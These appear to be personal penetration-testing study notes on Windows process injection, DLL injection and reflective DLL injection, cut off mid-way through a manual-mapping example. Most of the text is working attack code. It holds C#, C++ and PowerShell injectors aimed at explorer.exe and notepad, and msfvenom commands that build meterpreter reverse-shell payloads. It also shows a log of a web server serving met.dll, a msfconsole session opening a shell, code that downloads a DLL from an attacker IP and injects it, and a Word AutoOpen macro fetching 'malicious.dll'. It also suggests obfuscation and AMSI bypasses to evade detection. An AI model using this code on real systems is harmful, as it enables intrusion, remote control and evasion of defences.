- *process*: container created to house a running application
- process maintains it's own virtual memory space
- *thread* will have it's own stack and shares the virtual memory space of the process
- initial process injection Win32 api:
	- OpenProcess https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	- VirtualAllocEx https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	- WriteProcessMemory https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
	- CreateRemoteThread https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread


### OpenProcess

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```
- _dwDesiredAccess_, establishes the access rights
- we can only inject code into processes running at the same or lower integrity level of the current process. This makes explorer.exe a prime target because it will always exist and does not exit until the user logs off
- _bInheritHandle_, determines if the returned handle may be inherited by a child process and the third
- _dwProcessId_, specifies the process identifier of the target process

### VirtualAllocEx

```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```
- In our previous shellcode runner, we used _VirtualAlloc_ to allocate memory for our shellcode. Unfortunately, that only works inside the current process so we must use the expanded _VirtualAllocEx_ API. This API can perform actions in any process that we have a valid handle to.
### WriteProcessMemory

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
- _WriteProcessMemory_, will allow us to copy data into the remote process

### CreateRemoteThread

```c
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```
- Similarly, since _CreateThread_ does not support the creation of remote process threads, we must rely on the _CreateRemoteThread_ API instead.


# Process Injection in C\#

Note: Installed https://github.com/microsoft/CsWin32 into Win10 Visual Studio and System.Memory nuget packages

Errata/Update: 
- `dwDesiredAccess` has a 32 bit un-signed interger value and it establishes the access rights, there are hex values we can use for the access , the acess which we can use for all rights on a process is `PROCESS_ALL_ACCESS` which can be represented in hex `0x001FFFFF` 
- offsec guide uses `0x001F0FFF` which is for XP/2k3
- PROCCESS_ALL_ACCESS hex values (https://gist.githubusercontent.com/Rhomboid/0cf96d7c82991af44fda/raw/46b93265561362eb9d631b90a7731dc985ee378d/process_access_rights.txt)
- Note: PID 4804 below is for Explorer.exe will change each time Windows is run and the hex value for dwDesiredAccess is for win xp or 2k3
```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
```
- For P/Invoke purposes, you should use `IntPtr.Zero` in place of `NULL`. Note that this is not equivalent to the C# `null`
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(hostname -I | cut -d' ' -f1) LPORT=9001 EXITFUNC=thread -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Final size of csharp file: 2628 bytes
byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
...
0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
0xd5};

```

### Exercises 

### #2 
Modify the code of the ExampleAssembly project in DotNetToJscript to create a Jscript file that executes the shellcode inside explorer.exe. Instead of hardcoding the process ID, which cannot be known remotely, use the Process.GetProcessByName method to resolve it dynamically.
- convert to js
```powershell
 .\DotNetToJScript.exe C:\users\dooley\source\repos\InjectToJscript\InjectToJscript\bin\x64\Release\InjectToJscript.dll --lang=jscript --ver=v4 -o injecttojs.js -c InjectToJscript.Class1
```

### \#3

- Port the code from C# to PowerShell to allow process injection and shellcode execution from a Word macro through PowerShell. Remember that PowerShell is started as 32-bit, so instead of injecting into explorer.exe, start a 32-bit process such as Notepad and inject into that instead.
- create revshell payload in powershell format
```bash
 ❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=9001 EXITFUNC=thread -f ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Final size of ps1 file: 1830 bytes
```
- injection named injection2.ps1

### TODO:
#### Extra Mile

Process injection with _VirtualAllocEx_, _WriteProcessMemory_, and _CreateRemoteThread_ is considered a standard technique, but there are a few others to consider.

The low-level native APIs _NtCreateSection_, _NtMapViewOfSection_, _NtUnMapViewOfSection_, and _NtClose_ in ntdll.dll can be used as alternatives to _VirtualAllocEx_ and _WriteProcessMemory_.

Create C# code that performs process injection using the four new APIs instead of _VirtualAllocEx_ and _WriteProcessMemory_. Convert the code to Jscript with DotNetToJscript. Note that _CreateRemoteThread_ must still be used to execute the shellcode.

Not my code:
```csharp
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;



public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);


    [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
    static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

    [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
    static extern int NtClose(IntPtr hObject);


    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    dir
    
    public TestClass()
    {
        Process[] explorerProcesses = Process.GetProcessesByName("explorer");
        int firstExplorerPid = explorerProcesses[0].Id;

        byte[] buf = new byte[643]
        { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
        ...
        0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,
        0xd5 };

        IntPtr sHandle = new IntPtr();
        IntPtr lHandle = Process.GetCurrentProcess().Handle;
        IntPtr pHandle = OpenProcess(0x001F0FFF, false, firstExplorerPid);


        int len = buf.Length;
        uint uLen = (uint)len;
        long cStatus = NtCreateSection(ref sHandle, 0x10000000, IntPtr.Zero, ref uLen, 0x40, 0x08000000, IntPtr.Zero);

        IntPtr baseAddrL = new IntPtr();
        uint viewSizeL = uLen;
        ulong sectionOffsetL = new ulong();
        long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, 0x04);

        IntPtr baseAddrR = new IntPtr();
        uint viewSizeR = uLen;
        ulong sectionOffsetR = new ulong();
        long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, 0x20);

        Marshal.Copy(buf, 0, baseAddrL, len);

        CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero);

        uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);

        int clStatus = NtClose(sHandle);
    }
}
```
```cmd
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
## DLL Injection

### DLL Injection Overview

**DLL Injection** is a technique used to run arbitrary code in the address space of another process. This method is commonly used by malware to gain control over another process or by developers to extend the functionality of applications without modifying their source code.

**How DLL Injection Works:**

1. **Identifying the Target Process**: The first step is identifying the process into which the DLL will be injected.
2. **Allocating Memory**: Allocate memory in the target process's address space where the DLL will be loaded.
3. **Writing the Path of the DLL**: Write the path of the DLL to the allocated memory in the target process.
4. **Creating a Remote Thread**: Create a remote thread in the target process that calls `LoadLibrary`, passing the address of the DLL's path, causing the DLL to be loaded into the target process.
5. **Executing the Payload**: Once the DLL is loaded, the operating system will execute its entry point (typically `DllMain`), which can contain the payload.

### C++ Example of DLL Injection

```cpp
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return 0;
}

void InjectDLL(const char* processName, const char* dllPath) {
    DWORD processId = GetProcessIdByName(processName);
    if (processId == 0) {
        std::cerr << "Process not found." << std::endl;
        return;
    }

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!processHandle) {
        std::cerr << "Failed to open process." << std::endl;
        return;
    }

    void* allocMemory = VirtualAllocEx(processHandle, nullptr, strlen(dllPath) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!allocMemory) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(processHandle);
        return;
    }

    if (!WriteProcessMemory(processHandle, allocMemory, dllPath, strlen(dllPath) + 1, nullptr)) {
        std::cerr << "Failed to write memory in target process." << std::endl;
        VirtualFreeEx(processHandle, allocMemory, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return;
    }

    HANDLE threadHandle = CreateRemoteThread(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, allocMemory, 0, nullptr);
    if (!threadHandle) {
        std::cerr << "Failed to create remote thread." << std::endl;
        VirtualFreeEx(processHandle, allocMemory, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return;
    }

    WaitForSingleObject(threadHandle, INFINITE);
    VirtualFreeEx(processHandle, allocMemory, 0, MEM_RELEASE);
    CloseHandle(threadHandle);
    CloseHandle(processHandle);
    std::cout << "DLL injection successful." << std::endl;
}

int main() {
    const char* processName = "targetprocess.exe";
    const char* dllPath = "C:\\path\\to\\your\\dll.dll";
    InjectDLL(processName, dllPath);
    return 0;
}
```

### PowerShell Example of DLL Injection

```powershell
# Define the process name and DLL path
$processName = "notepad.exe"
$dllPath = "C:\\path\\to\\your\\dll.dll"

# Get the process ID of the target process
$process = Get-Process -Name $processName
$processId = $process.Id

# Open the process with all access rights
$processHandle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $processId)

# Allocate memory in the target process
$memoryAddress = [Kernel32]::VirtualAllocEx($processHandle, [IntPtr]::Zero, [Text.Encoding]::ASCII.GetByteCount($dllPath) + 1, 0x3000, 0x40)

# Write the DLL path to the allocated memory
[Kernel32]::WriteProcessMemory($processHandle, $memoryAddress, [Text.Encoding]::ASCII.GetBytes($dllPath), [Text.Encoding]::ASCII.GetByteCount($dllPath) + 1, [ref]$null)

# Load the DLL by creating a remote thread
$loadLibraryAddr = [Kernel32]::GetProcAddress([Kernel32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
$threadHandle = [Kernel32]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $loadLibraryAddr, $memoryAddress, 0, [ref]$null)

# Wait for the remote thread to complete
[Kernel32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)

# Clean up
[Kernel32]::VirtualFreeEx($processHandle, $memoryAddress, 0, 0x8000)
[Kernel32]::CloseHandle($threadHandle)
[Kernel32]::CloseHandle($processHandle)

Write-Output "DLL injection successful."
```

### Powershell  Dll injection in memory

```powershell
# Define the process name and DLL URL
$processName = "notepad.exe"
$dllUrl = "https://192.168.45.250:8000/myinjection.dll"

# Load the required functions
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
}
"@

# Download the DLL into memory
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)")
$webClient.Credentials = [System.Net.CredentialCache]::DefaultCredentials
$dllBytes = $webClient.DownloadData($dllUrl)

# Get the process ID of the target process
$process = Get-Process -Name $processName
$processId = $process.Id

# Open the process with all access rights
$processHandle = [Win32]::OpenProcess(0x1F0FFF, $false, $processId)

# Allocate memory in the target process for the DLL
$dllMemory = [Win32]::VirtualAllocEx($processHandle, [IntPtr]::Zero, [uint32]$dllBytes.Length, 0x3000, 0x40)

# Write the DLL to the allocated memory
$written = [IntPtr]::Zero
[Win32]::WriteProcessMemory($processHandle, $dllMemory, $dllBytes, [uint32]$dllBytes.Length, [ref]$written)

# Get the address of LoadLibraryA in kernel32.dll
$loadLibraryAddr = [Win32]::GetProcAddress([Win32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")

# Create a remote thread in the target process to load the DLL
$threadHandle = [Win32]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $loadLibraryAddr, $dllMemory, 0, [ref]$null)

# Wait for the remote thread to complete
[Win32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)

# Clean up
[Win32]::VirtualFreeEx($processHandle, $dllMemory, 0, 0x8000)
[Win32]::CloseHandle($threadHandle)
[Win32]::CloseHandle($processHandle)

Write-Output "In-memory DLL injection successful."

```
### DLL Injection with MS Word Macro

Although more complex, DLL injection can theoretically be performed using an MS Word Macro. The macro would execute the necessary Windows API calls via PowerShell or another scripting language capable of invoking native APIs. However, this approach is risky and would likely trigger security alerts.

Here's a simplified concept:

```vba

Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Sub AutoOpen()
    Dim downloadURL As String
    Dim filePath As String
    downloadURL = "http://example.com/malicious.dll"
    filePath = Environ("TEMP") & "\malicious.dll"
    URLDownloadToFile 0, downloadURL, filePath, 0, 0
    ShellExecute 0, "open", "powershell.exe", " -c ""[System.Reflection.Assembly]::LoadFile('C:\path\to\your\dll.dll')""", "", 0
End Sub

```

### Important Notes:

1. **Security Risks**: DLL injection, especially using methods like Word Macros, is highly risky and often used by malware. Any testing or development should be done in an isolated environment.
   
2. **Detection**: Modern security solutions often detect and block DLL injection attempts, especially when combined with scripting languages like VBA.

3. **Legal and Ethical Considerations**: Always ensure you have proper authorization to test or use these techniques.

- create payload and start web server
```bash
❯ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 -f dll -o met.dll
[sudo] password for roger: 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 781 bytes
Final size of dll file: 9216 bytes
Saved as: met.dll
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.141 - - [27/May/2024 13:12:35] "GET /met.dll HTTP/1.1" 200 -

```

- modified code to make the web connection more modern
- TODO: migrate the DllImport statements to CsWin32 or convert to c++
```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32.dll")]

        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);


        [DllImport("kernel32.dll")]

        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]

        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]

        public static extern IntPtr GetModuleHandle(string lpModuleName); 

        static readonly HttpClient client = new HttpClient();

        static async Task Main()

        {

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            String dllName = dir + "\\met.dll";

            try

            {

                HttpResponseMessage response = await client.GetAsync("http://192.168.1.113/met.dll");

                if (response.IsSuccessStatusCode)

                {

                    using (var fs = new FileStream(dllName, FileMode.Create, FileAccess.Write, FileShare.None))

                    {

                        await response.Content.CopyToAsync(fs);

                    }

                }

            }

            catch (HttpRequestException e)

            {
                Console.WriteLine("Exception Caught!");
                Console.WriteLine($"Message: {e.Message}");
            }


            Process[] expProc = Process.GetProcessesByName("explorer");

            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;

            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

        }

    }

}
```

```bash
❯ msfconsole
Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
with setg RHOSTS x.x.x.x
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.4.5-dev                           ]
+ -- --=[ 2413 exploits - 1242 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost eth0
lhost => eth0
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > show options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.1.113:443
[!] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Staging x64 payload (202844 bytes) ...
[!] https://192.168.1.113:443 handling request from 192.168.1.141; (UUID: 7efb85gt) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.1.113:443 -> 192.168.1.141:59838) at 2024-05-27 13:12:38 -0400

meterpreter > getuid
Server username: COMMANDO\<user>

```

## Reflective Dll Injection

Reflective DLL injection is a sophisticated technique often used in penetration testing and by malicious actors. This technique allows an attacker to inject a DLL into the memory of a process without writing the DLL to disk, making it harder to detect by traditional antivirus tools. 

Reflective DLL injection typically involves loading a DLL into the memory of a process and executing its code without using the standard Windows API (e.g., `LoadLibrary`). Instead, it uses custom code to manually map the DLL into memory.

### **Overview of Reflective DLL Injection**

1. **Reflective DLL**: A DLL that includes a loader function within it, responsible for loading the DLL into memory and resolving dependencies.
2. **Injector Process**: A process that injects the reflective DLL into the target process. The injection can be done using techniques like `CreateRemoteThread`, `SetThreadContext`, or even PowerShell.

### **Steps Involved in Reflective DLL Injection**

1. **Create a Reflective DLL**:
    - The DLL includes a custom loader that handles its own loading process (mapping sections, resolving imports, etc.).
    
2. **Inject the DLL into Target Process**:
    - Use a method (like `CreateRemoteThread` or PowerShell) to inject the DLL into a target process’s memory space.
    
3. **Execute the DLL's Code**:
    - Once injected, the DLL’s loader function is executed, which loads and runs the DLL within the target process.

### **Creating a Reflective DLL**

Below is an example of a minimal Reflective DLL written in C:

```c
#include <Windows.h>

// Function signature for the Reflective DLL loader
DWORD WINAPI ReflectiveLoader(LPVOID lpParameter)
{
    MessageBox(NULL, L"Reflective DLL Injection!", L"Success", MB_OK);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, ReflectiveLoader, NULL, 0, NULL);
        break;
    }
    return TRUE;
}
```

This DLL displays a message box when injected into a process. The `ReflectiveLoader` function is executed when the DLL is loaded.

### **Injecting the Reflective DLL Using PowerShell**

Below is a PowerShell script that demonstrates how to inject a Reflective DLL into a target process:

```powershell
# PowerShell script to perform Reflective DLL Injection

# Load the target DLL into memory
$ReflectiveDll = [System.IO.File]::ReadAllBytes("C:\path\to\your\reflective.dll")

# Get the handle of the target process (e.g., notepad.exe)
$Process = Get-Process -Name "notepad" # Change "notepad" to your target process
$ProcessHandle = (Get-Process -Id $Process.Id).Handle

# Allocate memory in the target process for the DLL
$RemoteMemoryAddress = [kernel32]::VirtualAllocEx($ProcessHandle, [IntPtr]::Zero, [UIntPtr]::new($ReflectiveDll.Length), 0x1000, 0x40)

# Write the DLL into the allocated memory
[Kernel32]::WriteProcessMemory($ProcessHandle, $RemoteMemoryAddress, $ReflectiveDll, [UInt32]$ReflectiveDll.Length, [UInt32]0)

# Get the address of the LoadLibrary function in kernel32.dll
$LoadLibraryAddr = [Kernel32]::GetProcAddress([Kernel32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")

# Create a remote thread in the target process to run the Reflective DLL
$RemoteThread = [Kernel32]::CreateRemoteThread($ProcessHandle, [IntPtr]::Zero, 0, $LoadLibraryAddr, $RemoteMemoryAddress, 0, [UInt32]0)

# Wait for the thread to finish
[Kernel32]::WaitForSingleObject($RemoteThread, 0xFFFFFFFF)

# Close the thread and process handles
[Kernel32]::CloseHandle($RemoteThread)
[Kernel32]::CloseHandle($ProcessHandle)
```

### **Explanation of the PowerShell Script**

1. **Load the Reflective DLL into Memory**:
   - The script reads the DLL from disk into a byte array using `[System.IO.File]::ReadAllBytes`.

2. **Get the Handle of the Target Process**:
   - The target process is identified (in this case, `notepad.exe`), and its handle is retrieved.

3. **Allocate Memory in the Target Process**:
   - The script allocates memory in the target process’s address space where the DLL will be injected.

4. **Write the DLL to the Allocated Memory**:
   - The DLL byte array is written into the target process’s allocated memory.

5. **Get the Address of `LoadLibraryA`**:
   - The script retrieves the address of the `LoadLibraryA` function from `kernel32.dll`. This is necessary to load the DLL in the remote process.

6. **Create a Remote Thread to Load the DLL**:
   - The script creates a remote thread in the target process that runs the `LoadLibraryA` function, which loads the injected DLL into the target process.

7. **Wait and Clean Up**:
   - The script waits for the remote thread to finish execution, then closes the handles to the thread and the process.

### **Advanced Considerations**

1. **Stealth**: To avoid detection, avoid using `LoadLibraryA` and instead use manual mapping techniques that do not rely on standard Windows APIs.
   
2. **Obfuscation**: The PowerShell script and DLL can be obfuscated to evade detection by security tools.
   
3. **Payload Execution**: Instead of a message box, the injected DLL could perform more complex tasks, such as establishing a reverse shell, keylogging, or other forms of persistence.

4. **Detection and Prevention**: Many security solutions monitor the creation of remote threads and suspicious API calls (e.g., `VirtualAllocEx`, `WriteProcessMemory`). Implementing AMSI (Antimalware Scan Interface) bypasses, or avoiding the use of standard Windows APIs can help avoid detection.

### **Additional Resources**

- **WinDbg**: For analyzing the behavior of the injected DLL within the target process.
- **Process Hacker**: A tool for monitoring process memory and threads, useful for verifying the injection.
- **PowerShell Empire**: A post-exploitation framework that includes similar techniques and can be a learning resource.

This method provides a powerful way to inject code into a remote process without touching the disk, making it an advanced but stealthy technique for testing or potentially malicious activities.

- Example, but the methods are older
```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
$procid = (Get-Process -Name explorer).Id
```
- more current version
```powershell
$response = Invoke-WebRequest -Uri "http://192.168.1.113/met.dll" -UseBasicParsing
$procid = (Get-Process -Name explorer).Id
```
- $response.Content is the byte array
- couldn't get the example to work (maybe machine needs a reboot?)


Manual mapping and obfuscation are advanced techniques used to inject code into a process while minimizing the chances of detection by security tools. These techniques are often used in offensive security, including penetration testing and malware development. Here’s an overview of how these techniques work and how they can be implemented.

### **1. Manual Mapping**

Manual mapping involves loading a DLL or other executable code into the memory of a process without relying on the standard Windows APIs like `LoadLibrary`. Instead, the code is manually parsed, relocated, and linked within the target process’s memory space.

#### **Steps Involved in Manual Mapping**

1. **Allocate Memory in the Target Process**: Similar to traditional injection, you need to allocate space in the target process for the DLL or shellcode.

2. **Parse the PE Header**: The Portable Executable (PE) header of the DLL contains information about how the sections of the DLL should be loaded into memory. This includes the `.text`, `.data`, and `.rdata` sections, among others.

3. **Relocate Sections**: Copy the relevant sections from the DLL into the allocated memory. If the DLL’s preferred base address is not available, you’ll need to adjust the memory addresses (relocation).

4. **Resolve Imports**: Manually resolve the DLL’s imported functions by locating their addresses in the process’s loaded modules (like `kernel32.dll`).

5. **Execute the Entry Point**: Finally, execute the DLL’s entry point (usually the `DllMain` function) to initialize the DLL.

#### **Example Code for Manual Mapping (C/C++)**

```cpp
#include <Windows.h>

bool ManualMap(HANDLE hProcess, BYTE* pSrcData) {
    // Parse the DOS header
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pSrcData;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return false;

    // Parse the NT headers
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pSrcData + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return false;

